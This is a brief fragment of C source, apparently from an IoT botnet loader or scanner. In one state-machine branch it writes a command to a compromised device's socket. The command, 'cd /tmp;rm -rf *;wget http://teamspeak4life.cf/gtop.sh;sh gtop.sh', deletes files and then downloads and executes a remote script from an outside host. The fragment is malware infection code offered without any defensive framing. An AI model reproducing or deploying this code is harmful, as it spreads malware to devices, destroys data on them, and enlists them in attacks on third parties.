			...
			case 8:
				{
					...
					if(send(fds[i].fd, "cd /tmp;rm -rf *;wget http://teamspeak4life.cf/gtop.sh;sh gtop.sh\r\n", 67, MSG_NOSIGNAL) < 0) { sclose(fds[i].fd); fds[i].state = 0; fds[i].complete = 1; memset(fds[i].sockbuf, 0, 1024); continue; }
